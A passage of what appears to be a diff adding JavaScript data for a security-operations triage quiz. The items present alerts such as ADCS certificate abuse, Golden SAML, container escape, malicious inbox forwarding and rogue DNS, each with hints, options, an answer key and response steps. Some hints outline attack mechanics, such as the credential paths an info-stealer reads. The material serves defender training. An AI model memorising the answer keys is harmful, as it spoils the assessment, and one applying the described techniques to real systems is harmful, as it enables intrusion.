+scenario:`Your UEBA alerts: a receptionist who normally accesses only 2-3 SharePoint sites has accessed 47 SharePoint sites across Engineering, Finance, Legal, and Executive departments in 90 minutes, downloading 312 files totaling 890 MB. Access started 8 minutes after their normal workday start.`,
+hint1:"A receptionist accessing every sensitive department's SharePoint in a single 90-minute session. How much access should a receptionist have to Engineering, Legal, and Executive SharePoint? What has changed?",
+hint2:"Check whether the user's SharePoint permissions recently changed (was there a permission misconfiguration?). Or is the account compromised and an attacker is doing broad data collection across all sites the account can reach?",
+options:["A new receptionist reviewing all company materials during onboarding","Data harvesting: account compromise or insider threat — systematic download across sensitive SharePoint sites","SharePoint auto-indexing new content for Microsoft Search","An IT audit reviewing SharePoint permissions using a service account"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Receptionist accessing Legal + Finance + Engineering + Executive SharePoint = account compromise or insider threat (T1213.002). 890 MB in 90 min = methodical collection. Actions: check physical presence (is actual user at workstation?); review SharePoint permission scope (over-permissioning + compromise = major breach); check outbound channels (email, USB, personal cloud); if insider: involve HR/Legal before confrontation; if compromise: isolate and investigate.</p><p><strong>Priority: HIGH — 890 MB cross-department sensitive data accessed.</strong></p>`},
+
+{id:"T29",title:"The Double VPN Bridge",mitre:"T1090 / T1572",
+scenario:`Proxy logs reveal an endpoint (10.0.0.77) connected to your corporate VPN is simultaneously making connections to unknown IPs on port 1194 (OpenVPN default) — not your VPN infrastructure. Your corporate VPN uses split tunneling. The second VPN destinations are flagged in threat intel.`,
+hint1:"Split tunneling lets a VPN-connected machine route some traffic through the corporate VPN and some directly to the internet. A machine simultaneously connected to your corporate VPN and an unknown VPN — what security risk does this create?",
+hint2:"The compromised endpoint has access to internal resources via your VPN. The second tunnel to a threat-intel-flagged destination could allow an attacker on the other end to reach internal resources through the endpoint as a pivot.",
+options:["An employee using a personal VPN for privacy while working from home","Double-VPN bridge: endpoint creating a tunnel between your corporate network and a malicious VPN infrastructure","Split tunneling routing video traffic directly to reduce VPN bandwidth","Windows auto-connecting to a VPN for an installed application"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Double-tunnel bridge (T1090, T1572): compromised endpoint with corporate VPN access + second tunnel to threat-intel-flagged destination = potential internal network pivot. Actions: revoke the endpoint's VPN certificate; investigate for malware or unauthorized VPN client; check if internal resources were accessed during this double-tunnel period; disable split tunneling in VPN policy (route ALL traffic through corporate VPN).</p><p><strong>Priority: HIGH — potential internal network bridge via compromised endpoint.</strong></p>`},
+
+{id:"T30",title:"The Midnight Bulk Delete",mitre:"T1485 / T1078",
+scenario:`At 12:03 AM, AWS CloudTrail records 2,847 S3 object deletions across 8 buckets by IAM user 'ci-deploy' — your CI/CD service account. No pipeline ran. The buckets contain production database backups, application code backups, and compliance/audit logs. Versioning is disabled on 6 of the 8 buckets.`,
+hint1:"2,847 S3 deletions at midnight by a CI/CD account with no pipeline running. 6 buckets without versioning means those deletions are permanent. What type of attack deletes backups and audit logs?",
+hint2:"Check if the deletions targeted backup and audit log buckets specifically (covering tracks / destruction) or all buckets indiscriminately (ransomware-style). How might the ci-deploy credentials have been exposed?",
+options:["CI/CD performing post-deployment cleanup of old build artifacts","Data destruction: compromised CI/CD credentials used to permanently delete production backups and audit logs","AWS S3 lifecycle policies executing scheduled object expiration","A developer running a cleanup script against production instead of dev"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Bulk S3 deletion (T1485) of backups and audit logs = either destructive attack or covering tracks. 6 unversioned buckets = permanent loss. Actions: check for versioning/cross-region replication on remaining buckets; contact AWS Support for recovery assistance (short window); rotate ci-deploy credentials immediately; check how credentials were leaked (most common: hardcoded in public GitHub, CI/CD log exposure); enable S3 Versioning + Object Lock on ALL buckets; this may be a compliance incident if audit logs were destroyed.</p><p><strong>Priority: CRITICAL — potential permanent loss of backups and compliance records.</strong></p>`},
+
+{id:"T31",title:"The ADCS Certificate Storm",mitre:"T1553.004 / T1588.004",
+scenario:`Your PKI monitoring alerts: your internal CA issued 847 new certificates in the last 3 hours via ADCS auto-enrollment — normal is 15-20/day. Certificates are for machine accounts matching 'ws-[random].corp.local'. Only 12 new computers joined AD this month. These names don't match real machines.`,
+hint1:"Your CA is issuing 847 certificates for machine accounts that don't exist in AD. ADCS auto-enrollment requires authentication. How could someone request certificates for non-existent machine accounts?",
+hint2:"ADCS ESC1 attack: if a certificate template allows the requester to specify the Subject Alternative Name and doesn't require CA manager approval, an attacker can request certificates for any identity — including domain admins or domain controllers.",
+options:["Windows ADCS auto-enrolling all domain computers during a certificate refresh","Active Directory Certificate Services abuse: attacker bulk-issuing certificates for potential privilege escalation","A PKI migration script enrolling certificates for all machines for a new CA","Windows domain join operations automatically requesting certificates for new computer accounts"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>ADCS misconfiguration abuse (T1553.004) — ESC1-ESC8 attacks are a major modern threat vector. 847 certs for non-existent machines = attacker testing or generating auth certificates. Actions: suspend ADCS auto-enrollment on the vulnerable template; revoke all 847 certificates; identify which template was abused and its misconfiguration; run Certify.exe or Certipy to audit ALL ADCS templates; identify the authenticating account that requested the certs.</p><p><strong>Priority: CRITICAL — ADCS misconfiguration enabling potential domain privilege escalation.</strong></p>`},
+
+{id:"T32",title:"The Poisoned DNS Record",mitre:"T1557 / T1589",
+scenario:`DNS monitoring detects unusual responses: your internal DNS server is returning two different IPs for 'internal-tools.corp.local' — the correct 10.0.10.50 (85%) and an unknown 10.0.99.77 (15%). Clients hitting 10.0.99.77 receive a convincing internal portal login page prompting for AD credentials.`,
+hint1:"Your DNS is returning a rogue IP for 15% of queries. 10.0.99.77 shows a convincing login page. Where did this IP come from, and what are users submitting to it?",
+hint2:"DNS cache poisoning or a rogue DNS record injected by an attacker with DNS admin access is redirecting some users to a credential phishing page. Every user who entered credentials on 10.0.99.77 has had their AD credentials captured.",
+options:["DNS load balancing distributing traffic between two internal app servers","DNS credential phishing: a rogue record redirecting users to a credential capture page","DNS replication delay between primary and secondary servers causing split-brain","A CDN using GeoDNS to route traffic to a regional cache"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>DNS manipulation → credential phishing (T1557, T1589.001). Active attack — every user hitting 10.0.99.77 and entering credentials has been compromised. Actions: (1) Remove the rogue record or flush poisoned cache IMMEDIATELY; (2) Identify all users who connected to 10.0.99.77 via proxy/firewall logs — reset ALL their credentials; (3) Investigate how the rogue record was created (who has DNS admin rights? Check DNS debug log EIDs 2001/2003); (4) Check for similar rogue records on other internal domains.</p><p><strong>Priority: CRITICAL — active credential theft via DNS manipulation.</strong></p>`},
+
+{id:"T33",title:"The Slack BEC Impersonation",mitre:"T1534 / T1656",
+scenario:`An employee reports a Slack DM from 'CEO FirstName LastName' asking them urgently to purchase $15,000 in gift cards for a client appreciation event. The CEO is at a conference this week. The Slack username is 'ceo.firstlast.001' — your real CEO's username is 'ceo.firstlast'. The employee has not yet purchased the cards.`,
+hint1:"The Slack username has '001' appended — it's a fake account impersonating the CEO. The request pattern (gift cards, urgency, traveling CEO) is a well-known BEC formula. Has money actually been transferred yet?",
+hint2:"Check if this fake account contacted any other employees. The urgency + authority + gift card pattern is the most common BEC financial fraud technique — attackers target accounts payable and admin staff. Report to Slack for impersonation.",
+options:["The CEO's legitimate Slack account with a modified username from a workspace migration","Business Email Compromise via Slack: a fake executive account attempting gift card fraud","A Slack workspace merge creating a duplicate account with an appended number","The CEO creating a temporary account while their primary was being reset"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>BEC via Slack impersonation (T1534, T1656). Gift cards = fast, anonymous, irreversible. If cards were purchased: get card numbers/PINs immediately (some providers can freeze if unredeemed). Actions: confirm no purchase was made; report the fake profile to Slack for impersonation; search Slack for other DMs from this account; send company-wide awareness alert; implement Slack username verification/pinning for executive accounts.</p><p><strong>Priority: HIGH — potential financial fraud attempt in progress.</strong></p>`},
+
+{id:"T34",title:"The Service Principal Backdoor",mitre:"T1098.001 / T1136",
+scenario:`Azure AD audit logs: a service principal 'HealthCheck-Monitoring-Tool' had a new client secret added at 2:33 AM by a guest user account invited 3 days ago. The service principal has Mail.ReadWrite and User.ReadWrite.All application permissions. No change request exists.`,
+hint1:"A guest account 3 days old adding credentials to a high-privilege service principal at 2:33 AM. What can an attacker do with application-level Mail.ReadWrite and User.ReadWrite.All permissions?",
+hint2:"Application permissions (not delegated) run without any signed-in user — they have tenant-wide access indefinitely. Mail.ReadWrite on all mailboxes = read/write every email in your M365 tenant. User.ReadWrite.All = modify any user account, including adding passwords or disabling MFA.",
+options:["An IT admin adding monitoring tool credentials for an automated health check integration","Service principal credential abuse: compromised guest account adding backdoor credentials to a high-privilege app","Azure Automation renewing expired service principal credentials","A vendor refreshing their API credentials in your tenant"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Service principal backdoor (T1098.001): with the new client secret, the attacker can read every email in your tenant and modify any user account — indefinitely, without user interaction. Actions: remove the new client secret immediately; review Graph API activity since 2:33 AM; disable the guest account; investigate who invited the guest and why; implement admin consent workflow for service principal modifications; require PIM for privileged role-holders who can modify service principals.</p><p><strong>Priority: CRITICAL — tenant-wide mailbox and user account access potential.</strong></p>`},
+
+{id:"T35",title:"The Registry Credential Harvest",mitre:"T1552.002 / T1555",
+scenario:`Sysmon EID 13 captures a process named 'svcupdate.exe' (from C:\\ProgramData) reading registry paths at 4:11 AM: HKCU Internet Settings (proxy/creds), Chrome's Login Data path, HKLM Winlogon (autologon credentials), and Software\\SimonTatham\\PuTTY\\Sessions.`,
+hint1:"These registry paths contain: saved proxy/web credentials, the path to Chrome's credential database, Windows autologon credentials (if configured), and PuTTY SSH connection details with saved keys. What type of malware systematically reads all of these?",
+hint2:"This is a credential stealer performing registry-based harvesting. PuTTY sessions can contain SSH private keys and server details. Chrome's Login Data is the SQLite database containing saved passwords. The stealer will exfiltrate all of this to a C2 server.",
+options:["A Windows optimization tool auditing registry settings for performance","A credential stealer harvesting saved credentials from browser registry paths and SSH tools","A backup agent capturing user preference keys for DR","Windows Credential Manager performing a scheduled cache update"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Info-stealer malware (T1552.002, T1555.003): systematic registry-based credential collection. C:\\ProgramData location + 4 AM execution = persistent stealer. Actions: isolate workstation; remove svcupdate.exe and persistence mechanisms; assume ALL stored credentials compromised — reset every account the user has: browser-saved passwords, SSH keys, Windows autologon, VPN; check for outbound exfiltration connections; hunt svcupdate.exe hash across the environment.</p><p><strong>Priority: HIGH — all stored credentials compromised.</strong></p>`},
+
+{id:"T36",title:"The VDI Data Bypass",mitre:"T1052 / T1048",
+scenario:`VDI monitoring alerts: a user's VMware Horizon session copied 3.2 GB from within the VDI to a USB drive connected to their physical client machine in 8 minutes. Your VDI policy should have USB redirection disabled. The user works in a secure research environment with ITAR compliance requirements.`,
+hint1:"USB redirection was supposed to be disabled. 3.2 GB from a secure ITAR-controlled environment via USB in 8 minutes. What is the legal risk if this was intentional exfiltration of ITAR-controlled technical data?",
+hint2:"Check if USB redirection was accidentally re-enabled in a recent Horizon policy update. Also check the VDI session logs for what files were transferred — were they ITAR-controlled? Was the USB an encrypted corporate device or personal drive?",
+options:["A user legitimately transferring files for an authorized project presentation","Unauthorized data exfiltration from a secure VDI bypassing USB controls — potential ITAR violation","VMware Horizon backing up user profile data to a portable drive","IT performing an authorized data migration to a new storage device"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>ITAR violation risk (T1052): unauthorized transfer of export-controlled technical data. Civil penalties up to $1M per violation + criminal exposure. DO NOT alert the user — contact Legal and Compliance IMMEDIATELY. Preserve VDI session recording and all logs; determine file classification; identify USB device authorization status; this may require State Department reporting; audit ALL VDI USB policy settings; investigate whether the policy was misconfigured or intentionally bypassed.</p><p><strong>Priority: CRITICAL — potential federal compliance violation.</strong></p>`},
+
+{id:"T37",title:"The Golden SAML",mitre:"T1606.002 / T1558",
+scenario:`Azure AD sign-in logs show 12 authentication events using SAML assertions for accounts in your tenant. The assertions originate from your on-premises ADFS server — but ADFS logs show NO corresponding authentication events for these 12 sessions. The assertions have valid signatures using your ADFS signing certificate.`,
+hint1:"Valid SAML assertions with your ADFS certificate exist — but ADFS never generated them. What does this mean about the ADFS signing certificate's security?",
+hint2:"Golden SAML (used in the SolarWinds breach): if an attacker stole the ADFS token-signing certificate's private key, they can forge SAML assertions for any user — even users that don't exist — and authenticate to any service trusting your ADFS.",
+options:["ADFS log sync lag causing sign-in events to appear before ADFS records them","Golden SAML attack: the ADFS signing certificate was stolen and used to forge authentication tokens","Azure AD caching previous SAML assertions for performance","A federated identity provider reusing assertions for session persistence"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Golden SAML (T1606.002) — nation-state level technique used in SolarWinds/SUNBURST. With the ADFS signing cert, attackers forge tokens for any identity, granting access to all SAML-trusting services (Azure AD, O365, Salesforce, etc.) without password or MFA. CRITICAL: immediately revoke and replace the ADFS signing certificate; force re-authentication for all federated users; audit the 12 authenticated sessions; assume ADFS server is fully compromised; engage MSFT DART or specialized IR firm.</p><p><strong>Priority: CRITICAL — identity federation fully compromised.</strong></p>`},
+
+{id:"T38",title:"The Container Escape",mitre:"T1611 / T1610",
+scenario:`Falco (Kubernetes security) alerts: a container in your 'web-frontend' namespace is executing system calls not typical for web containers — ptrace() on host processes and writing to /proc/sysrq-trigger. The container image is nginx:1.19.0. A moment later a new process appears on the Kubernetes node (outside the container namespace) spawned by a container process.`,
+hint1:"A container writing outside its namespace to host system paths and spawning host processes means the container has escaped its isolation. What privileges or misconfigurations allow a container to escape?",
+hint2:"Common container escapes: privileged container, hostPID enabled, dangerous capabilities (CAP_SYS_ADMIN, CAP_SYS_PTRACE), or writable /proc mounts. Check the pod's security context in Kubernetes.",
+options:["Nginx performing normal operations requiring elevated kernel access","Container escape: a compromised nginx container breaking out to execute code on the Kubernetes node","Kubernetes health-checking the container from the host","Container orchestration update temporarily accessing host processes for configuration"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Container escape (T1611) = attacker executing code on the Kubernetes node itself — access to all other containers on that node, node credentials, and potentially cluster-admin via the node's service account token. Actions: cordon and drain the node (kubectl cordon → kubectl drain); terminate the malicious container; audit pod spec for misconfigurations (privileged=true, hostPID=true); rotate all secrets accessible from that node; implement Pod Security Admission to prevent privileged containers; update nginx:1.19.0 (has known CVEs).</p><p><strong>Priority: CRITICAL — Kubernetes node compromise, all co-located containers at risk.</strong></p>`},
+
+{id:"T39",title:"The Email Forwarding Backdoor",mitre:"T1114.003 / T1564",
+scenario:`During an M365 audit, you discover an Outlook inbox rule on the CFO's mailbox named 'Archive': it forwards all emails containing 'wire transfer', 'payment', 'invoice', 'bank', or 'ACH' to an external Gmail (cfo.assist@gmail.com), then marks them as read and moves to Deleted Items. The CFO didn't create it. The rule was created 47 days ago.`,
+hint1:"This rule has been secretly forwarding financial emails to an external Gmail for 47 days — hiding them from the CFO. What is the attacker collecting, and how will they use this intelligence?",
+hint2:"47 days of wire transfer, payment, and invoice emails = the attacker knows your banking relationships, payment cycles, vendor names, amounts, and processes. This is the intelligence-gathering phase for a BEC fraud attempt.",
+options:["The CFO setting up email archiving using a personal backup address","A persistent email forwarding rule: 47 days of financial intelligence collected — BEC setup in progress","An M365 compliance policy automatically forwarding regulated communications","IT creating an email backup rule for the CFO as part of continuity planning"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>47-day malicious inbox rule (T1114.003, T1564.008) = BEC intelligence operation. The attacker now knows everything needed to craft a perfect wire transfer fraud request. Actions: remove the rule immediately; review all CFO email for the 47-day window; notify Finance — review ALL recent wire transfers for suspicious changes; check how the CFO account was compromised; check ALL executive mailboxes for similar rules; contact your bank to place fraud alerts on outgoing wires; engage cyber insurance and Legal.</p><p><strong>Priority: CRITICAL — 47-day financial intelligence collection. Imminent BEC fraud risk.</strong></p>`},
+
+{id:"T40",title:"The Malicious Chrome Extension",mitre:"T1176 / T1185",
+scenario:`Your endpoint management platform reports 23 endpoints have an unapproved Chrome extension installed: 'PDF Converter Pro' (ID: aabbccddeeff). It requests 'Read and change all your data on websites you visit', 'Manage downloads', and 'Read browsing history'. Security research reveals this extension ID was taken over by a malicious actor 3 weeks ago after the original developer sold it.`,
+hint1:"A Chrome extension with access to all website data can read the content of any page the user visits — including corporate web apps, banking portals, and any form field. 23 users have had this for 3 weeks. What has potentially been captured?",
+hint2:"Malicious browser extensions act as in-browser keyloggers, session token stealers, and form field harvesters — all within the browser sandbox, bypassing host-based security tools. What sensitive activities do your users perform in Chrome?",
+options:["A legitimate PDF converter requiring broad permissions to convert web content","A compromised browser extension harvesting credentials and session tokens from 23 endpoints for 3 weeks","Chrome automatically updating to a new extension version with expanded permissions","An IT-deployed productivity extension using standard browser permission scopes"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Browser extension supply chain takeover (T1176): after original dev sold the extension, new owner pushed malicious code update silently. 3 weeks × 23 endpoints = significant credential exposure. Actions: force-remove via Chrome Enterprise policy; assume all web credentials entered by these users in 3 weeks are compromised — reset all passwords; revoke all web sessions; implement Chrome Enterprise extension allowlisting; enroll in extension monitoring.</p><p><strong>Priority: HIGH — 23 endpoints, 3 weeks of potential credential theft.</strong></p>`},
+
+{id:"T41",title:"The Suspicious Firewall Rule",mitre:"T1562.004 / T1105",
+scenario:`Your change management system alerts: a firewall rule was added at 1:17 AM on a weekend allowing ANY inbound traffic on port 4444 to internal server 10.0.0.200. The change was attributed to the 'firewall-admin' service account — unused for 11 months. The rule was supposed to be disabled after account cleanup. The rule name is 'Temp-Admin-Access'.`,
+hint1:"A dormant firewall service account activated at 1:17 AM on a weekend to open port 4444 (Metasploit default) inbound to an internal server. What does port 4444 inbound on an internal server enable for an attacker?",
+hint2:"Port 4444 inbound allows a Metasploit or other C2 listener to be reached from the internet, or signals that a reverse shell on 10.0.0.200 is being prepared to listen for attacker connections. The dormant firewall-admin account being used = account compromise.",
+options:["IT creating a temporary rule for emergency remote maintenance","An attacker opening an inbound C2 port using a compromised firewall admin account","A scheduled firewall policy refresh re-enabling a previously disabled rule","A network monitoring tool requiring inbound access on port 4444"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Firewall rule manipulation (T1562.004) + dormant account compromise + C2 port (4444) = attacker preparing to establish persistent C2 access or has already compromised 10.0.0.200. Actions: remove the rule immediately; disable firewall-admin account; investigate 10.0.0.200 for any active listeners or malware; check all other firewall rules for similar unauthorized changes; audit how firewall-admin was compromised; implement MFA and change approval for firewall management.</p><p><strong>Priority: CRITICAL — attacker-controlled firewall rule enabling C2 access.</strong></p>`},
+
+{id:"T42",title:"The Midnight Mass Unlock",mitre:"T1531 / T1078",
+scenario:`Your SIEM alerts at 3:22 AM: 127 disabled user accounts were re-enabled in Active Directory within a 4-minute window. The re-enabling was performed by a single domain admin account. The domain admin account holder is a sysadmin who is on sick leave this week. Most of the re-enabled accounts are former employees disabled during offboarding.`,
+hint1:"127 disabled accounts re-enabled at 3:22 AM by a sysadmin on sick leave. Former employee accounts being re-enabled give an attacker many potential login vectors. Why would an attacker want to re-enable multiple old accounts?",
+hint2:"Re-enabling old offboarded accounts gives the attacker multiple backdoor accounts with legitimate-looking history. If any have email addresses, they can be used for internal phishing. If they have domain access, they can be used for lateral movement. Re-enabling 127 accounts at once from a compromised sysadmin account is a persistence spray technique.",
+options:["AD automatically re-enabling accounts after a replication issue resolution","An attacker using a compromised sysadmin account to re-enable 127 former employee accounts as backdoors","A helpdesk batch-processing return-to-work requests after a company holiday","Windows LAPS resetting account states during a policy refresh"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Mass account re-enablement (T1531 / T1078) = persistence spray via compromised domain admin. Actions: immediately re-disable ALL 127 accounts; disable the sysadmin's account; audit ALL domain admin activity for the last 24 hours; check if any of the 127 re-enabled accounts have already authenticated; investigate how the sysadmin account was compromised (phishing? password spray? remote access while sick?); implement account re-enablement approval workflows.</p><p><strong>Priority: CRITICAL — 127 backdoor accounts potentially active.</strong></p>`},
+
+{id:"T43",title:"The Ransomware Precursor Email",mitre:"T1566.001 / T1055",
+scenario:`Threat intel feeds flag a new campaign: a threat actor (tracked as 'FIN-X') is targeting your industry sector with spearphishing emails containing a password-protected ZIP. The email claims to be an invoice. Your email gateway logs show 3 employees in accounts payable received this exact email pattern 2 hours ago. None have been blocked. You cannot confirm if any were opened.`,
+hint1:"Three accounts payable employees received a suspected FIN-X initial access email 2 hours ago. The password is typically included in the email body to bypass ZIP-based AV scanning. What do you do before you know if they were opened?",
+hint2:"Even if you can't confirm the emails were opened, the threat actor's TTP is known. Check your EDR for any process anomalies on the three accounts payable workstations in the last 2 hours. Threat intel says FIN-X typically deploys a loader within 15 minutes of attachment execution.",
+options:["Wait for the users to report any issues before taking action","Proactive response: investigate the three workstations now regardless of whether users reported opening the attachment","Quarantine the emails and notify the users to not open them","File a threat intel report and continue monitoring passively"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Known campaign + targeted delivery = don't wait for users to report. The 2-hour window means a loader may already be running. Actions: pull EDR telemetry for all 3 workstations NOW — look for process anomalies, encoded PS execution, unusual network connections in the last 2 hours; quarantine the emails from the inboxes immediately; brief the 3 users and have them NOT interact with the email; if EDR shows clean — continue monitoring; if EDR shows activity — isolate immediately.</p><p><strong>Priority: HIGH — known ransomware precursor campaign, 3 targeted endpoints.</strong></p>`},
+
+{id:"T44",title:"The Vendor Access Overstay",mitre:"T1078.002 / T1098",
+scenario:`During a quarterly access review, you discover a VPN account for a vendor (Acme IT Consulting) that completed their project engagement 8 months ago. The account is still active and has been logging in regularly — most recently 3 days ago. The VPN logs show the account has been accessing internal servers in the R&D network segment, which was not part of their original project scope.`,
+hint1:"A vendor account for a completed engagement that's still active, logging in regularly, and accessing R&D systems outside their original scope. What are the two most likely explanations?",
+hint2:"Either: (1) the vendor account was compromised and an external attacker has been using it for persistent access for 8 months while the real vendor doesn't know; or (2) the vendor is performing unauthorized access to your R&D systems. Either scenario requires immediate action.",
+options:["A vendor proactively monitoring their previous work as a courtesy","Either a compromised vendor account or unauthorized vendor access — both require immediate investigation","An automated system using the vendor credentials for scheduled maintenance","The vendor account automatically renewing after the vendor renewed their business license"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Stale vendor account with unauthorized R&D access (T1078.002) = either 8-month persistent access by an attacker or unauthorized vendor espionage. Actions: disable the account IMMEDIATELY; check all R&D server access logs for this account going back 8 months; contact the vendor through a verified out-of-band channel — did they know about this access?; preserve logs for legal; implement vendor access expiration policies with automatic disablement; conduct quarterly access reviews as a standard process.</p><p><strong>Priority: HIGH — 8 months of potential unauthorized R&D access.</strong></p>`},
+
+{id:"T45",title:"The Azure VM Crypto Mine",mitre:"T1496 / T1552",
+scenario:`Your Azure Cost Management alerts fire: an unexpected $47,000 charge is appearing on your Azure subscription for the current month. Investigating, you find 47 high-CPU VM instances (Standard_NC series — GPU-optimized) were spun up 6 days ago in East US 2 — a region you don't normally use. The VMs were created by a service principal your dev team uses for CI/CD deployments.`,
+hint1:"47 GPU-optimized VMs ($47,000) created by a CI/CD service principal in a region you don't use. GPU VMs are specifically designed for high-performance compute. What cloud-based activity consumes massive GPU resources and incurs enormous costs?",
+hint2:"GPU-optimized VMs (NC series in Azure) are used for ML training or cryptocurrency mining. At $47,000 in 6 days, this is cloud cryptomining. The CI/CD service principal's credentials were likely stolen — check GitHub repos and CI/CD logs for credential exposure.",
+options:["Dev team running large-scale machine learning experiments in a new region","Cloud cryptomining: stolen CI/CD service principal credentials used to spin up GPU VMs for mining","Azure automatically provisioning resources for a load spike on your production application","A DR test spinning up identical infrastructure in a secondary region"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Cloud cryptomining (T1496) via stolen service principal credentials. $47,000 in 6 days. Actions: delete ALL 47 VMs immediately; rotate the CI/CD service principal credentials; investigate how they were leaked (most common: hard-coded in public GitHub repo — search github.com/your-org for the client ID); check if the principal was used for anything beyond VM creation (data access, config changes); implement Azure Budget Alerts and VM creation restrictions; enable Microsoft Defender for Cloud.</p><p><strong>Priority: HIGH — $47K unauthorized cloud spend, credential compromise.</strong></p>`},
+
+{id:"T46",title:"The Midnight Password Reset Storm",mitre:"T1556 / T1098",
+scenario:`At 12:44 AM, your SIEM triggers: an on-premises AD account (helpdesk_automation) reset passwords for 312 user accounts in 7 minutes. These include accounts for C-suite executives, finance staff, IT administrators, and the CISO. The helpdesk_automation account is supposed to only reset passwords on verified tickets with manager approval. No tickets exist for these resets.`,
+hint1:"312 password resets in 7 minutes at 12:44 AM by an automation account — hitting C-suite, finance, IT admins, and the CISO. Who gets locked out of their accounts if their passwords are reset without notice?",
+hint2:"Mass password resetting of key accounts without user notification is an account disruption attack. The targeted selection (executives + IT + finance) suggests the attacker wants to: (1) lock out defenders from responding, (2) take over specific high-value accounts, (3) create organizational chaos as a precursor to another attack.",
+options:["Helpdesk running a batch password reset for a scheduled security compliance audit","Account disruption attack: a compromised automation account resetting 312 accounts to cause chaos or lock out defenders","Windows LAPS automatically rotating passwords on a maintenance schedule","An AD sync operation pushing password updates from a third-party IdP"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Account disruption attack (T1556, T1098): targeted mass password reset of executives and IT admins at midnight = precursor to a larger attack or attempt to lock out responders. Actions: immediately use a break-glass admin account to reset helpdesk_automation credentials; restore all 312 accounts' passwords (you should have backup of pre-reset hashes or force user-initiated resets); verify all CISO and IT admin accounts are accessible for response; investigate how helpdesk_automation was compromised; this may be ransomware preparation.</p><p><strong>Priority: CRITICAL — 312 accounts disrupted, likely ransomware or major attack precursor.</strong></p>`},
+
+{id:"T47",title:"The Phantom DNS Server",mitre:"T1584.002 / T1071.004",
+scenario:`Your network team notices clients in the 10.0.20.0/24 subnet are using a DNS server at 10.0.20.250 — which does not appear in your DHCP configuration or DNS infrastructure inventory. The IP 10.0.20.250 doesn't appear in your asset database. DNS queries to this server are being answered, but responses for several corporate domains are returning external IPs instead of your internal server addresses.`,
+hint1:"An unauthorized DNS server responding to client queries and returning wrong IPs for your internal corporate domains. Clients connecting to wrong IPs for internal apps — what is this attack enabling?",
+hint2:"A rogue DNS server selectively returning wrong IPs for internal domains while correctly answering everything else (so users don't notice) is DNS hijacking. Clients are being redirected to attacker-controlled servers for corporate applications — credential capture, session theft.",
+options:["A secondary DNS server added by the network team for redundancy","Rogue DNS server: an unauthorized DNS resolver selectively redirecting internal domain traffic for credential capture","A DNS caching appliance added by IT to improve resolution performance","A misconfigured DHCP scope pushing a test DNS server address to clients"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Rogue DNS server (T1584.002, T1071.004) performing selective DNS hijacking: clients in the /24 subnet are being redirected to attacker-controlled servers for corporate applications. All credentials entered on the fake servers are captured. Actions: identify 10.0.20.250 physically on the network (NAC MAC lookup → switch port); take it offline; identify which corporate domains were returning wrong answers and for how long; reset credentials for all affected users; implement DHCP Snooping and DNS traffic monitoring to detect unauthorized DNS servers.</p><p><strong>Priority: CRITICAL — active DNS hijacking, credentials being captured.</strong></p>`},
+
+{id:"T48",title:"The Lateral Outlook Rule",mitre:"T1534 / T1566",
+scenario:`Your SOC receives an internal phishing report: an employee received a suspicious email from their colleague 'bob.smith@yourcompany.com' asking them to review an 'urgent contract update' attachment. You investigate bob.smith's account and find an Outlook rule that auto-forwards all received emails to bob.smith's personal Gmail and auto-replies to every email with a message containing a link to a phishing page on 'contract-review-portal.net'.`,
+hint1:"bob.smith's account is auto-forwarding all his received emails to an external Gmail AND auto-replying to every email with a phishing link. How many people has this phishing link been sent to so far, and how far could this spread?",
+hint2:"If bob.smith receives internal emails from 50 colleagues per day and the rule has been active for 5 days, that's 250+ internal phishing emails sent from a trusted internal address. Every recipient who clicked the link may also be compromised and spreading the same rule.",
+options:["bob.smith setting up an email auto-responder while on vacation","Compromised account spreading phishing laterally via Outlook auto-reply rules","An email marketing tool sending automated follow-up messages","A legitimate contract review workflow using an external portal"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Compromised account + malicious Outlook rules (T1534) = internal phishing amplification. Every person bob.smith received email from in the last N days has received an internal phishing email from a trusted colleague. Actions: disable bob.smith's account; remove the malicious Outlook rules; identify ALL emails sent by the auto-reply rule; check if any recipients clicked the link (proxy logs for contract-review-portal.net); check those recipients for the same Outlook rule pattern; assess how many accounts are in the cascade.</p><p><strong>Priority: CRITICAL — internal phishing cascade from compromised account. Scope may be large.</strong></p>`},
+
+{id:"T49",title:"The Anomalous Print Job",mitre:"T1213 / T1048",
+scenario:`Your print server monitoring alerts: a color laser printer in the legal department printed 2,847 pages between 11:30 PM and 2:15 AM last night. All print jobs were submitted from a workstation assigned to a paralegal. The paralegal's normal print volume is under 20 pages/day. Review of print job names includes 'contract_final_v3.pdf', 'client_agreements_2024.pdf', and 'mergers_confidential.pdf'.`,
+hint1:"Nearly 3,000 pages of confidential legal documents printed at midnight from a paralegal's workstation. What are the two most likely explanations, and which indicators would help you distinguish between them?",
+hint2:"Check badge access for the paralegal (were they in the office at midnight?), whether the workstation was logged in interactively or remotely, and whether the print jobs match files the paralegal normally accesses. Also check if similar print spikes happened on previous nights.",
+options:["A paralegal working late to prepare materials for an early morning court hearing","Either account compromise with data theft via printing, or insider threat — physical document exfiltration","A printer driver issue causing it to reprint a large job queue overnight","Scheduled print jobs for a regular monthly document distribution"],
+correct:1,
